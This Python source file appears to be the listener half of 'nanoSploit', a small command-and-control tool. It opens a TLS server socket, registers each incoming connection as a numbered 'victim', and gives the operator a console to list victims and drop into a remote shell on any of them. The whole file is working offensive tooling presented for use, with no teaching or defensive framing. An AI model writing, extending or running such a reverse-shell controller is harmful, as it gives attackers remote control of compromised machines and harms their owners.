import socket
import ssl
import os
import threading
import subprocess

from nanosploit.victim import Victim

# Static globals
BANNER = """
                         ____        _       _ _   
  _ __   __ _ _ __   ___/ ___| _ __ | | ___ (_) |_ 
 | '_ \ / _` | '_ \ / _ \___ \| '_ \| |/ _ \| | __|
 | | | | (_| | | | | (_) |__) | |_) | | (_) | | |_ 
 |_| |_|\__,_|_| |_|\___/____/| .__/|_|\___/|_|\__|
                              |_|                  
Version: 0.2
"""
PROMPT = "\033[4mnanoSploit\033[0m"
PORT = os.getenv("NANOSPLOIT_PORT", 8000)
SSL_CERT_PATH = os.getenv("NANOSPLOIT_SSL_CERT_PATH", "/tmp/nanosploit_cert.pem")
SSL_KEY_PATH = os.getenv("NANOSPLOIT_SSL_KEY_PATH", "/tmp/nanosploit_key.pem")
GEN_SSL_CMD = f'openssl req -newkey rsa:2048 -nodes -keyout {SSL_KEY_PATH} -x509 -days 365 -out {SSL_CERT_PATH} ' \
              f'-subj /C=XX/ST=N/L=A/O=N/OU=O/CN=SPLOIT'

# Mutable globals
next_id = "1"


def set_certificate_files(context: ssl.SSLContext):
    if os.path.exists(SSL_KEY_PATH) and os.path.exists(SSL_CERT_PATH):
        print(f"🔏 Using certificate files that already exists at {SSL_CERT_PATH} and {SSL_KEY_PATH}")
        context.load_cert_chain(SSL_CERT_PATH, SSL_KEY_PATH)
    else:
        print(f"🔏 Generating new certificate files at {SSL_CERT_PATH} and {SSL_KEY_PATH}")
        p = subprocess.run(GEN_SSL_CMD.split(" "))
        if p.returncode != 0:
            raise Exception("Error generating certificate files !")
        context.load_cert_chain(SSL_CERT_PATH, SSL_KEY_PATH)


def init_server() -> ssl.SSLSocket:
    # Create socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

    # Create SSL context
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.verify_mode = ssl.CERT_NONE
    set_certificate_files(context)

    ss = context.wrap_socket(s, server_side=True)

    # Start listening
    ss.bind(("0.0.0.0", PORT))
    ss.listen()
    print(f"📞 Listening on port {PORT}")

    # Return secure socket
    return ss


def accept_connections(ss: ssl.SSLSocket, clients: dict[str, Victim]):
    """
    Accept new connections from incoming victims
    :param ss: SSLSocket
    :param clients: list[SSLSocket]
    """
    while True:
        conn, addr = ss.accept()
        global next_id
        print(f"\rNew victim from {addr} => ID {next_id}")
        clients[next_id] = Victim(next_id, conn, addr)
        next_id = str(int(next_id) + 1)
        print(f"{PROMPT} > ", end="", flush=True)


def select_client(client_id: str, clients: dict[str, Victim]):
    # check if id exist
    if client_id in clients.keys():
        if not clients[client_id].enter_shell():
            print(f"Lost client '{client_id}' connection !")
            del clients[client_id]
    else:
        print(f"No active connection with id '{client_id}'")


def process_cmd(args: str, clients: dict[str, Victim]):
    args_list = args.split(" ")

    # Check for first keyword
    match args_list[0]:
        case "clients":
            # Command to list active clients
            if len(clients):
                print("Nb.\tClient")
                for i, client in clients.items():
                    print(f"{i}.\t{client}")
            else:
                print("No active clients")
        case "client":
            # Command to select a victim
            if args_list[1].isdigit():
                select_client(args_list[1], clients)
            else:
                print(f"Unknown command: '{args}'")
        case _:
            print(f"Unknown command: '{args}'")


def main_shell(clients: dict[str, Victim]):
    while True:
        cmd: str = input(f"{PROMPT} > ")
        if cmd in ("exit", "quit", "q"):
            break
        elif cmd:
            process_cmd(cmd, clients)


def main():
    print(BANNER)

    # Initiate secure server socket and return it
    ss = init_server()

    # Init clients list
    clients: dict[str, Victim] = {}

    # Accept clients
    t = threading.Thread(target=accept_connections, args=(ss, clients), daemon=True)
    t.start()
    print("📝 Starting thread to accept new clients")

    print("🤘 Everything has been setup -> let's hack !\n")
    try:
        main_shell(clients)
    except KeyboardInterrupt:
        pass
    finally:
        print("\rExiting nanoSploit ... ")
        # Close every connection
        for i, client in clients.items():
            client.conn.close()
        ss.close()


if __name__ == "__main__":
    main()
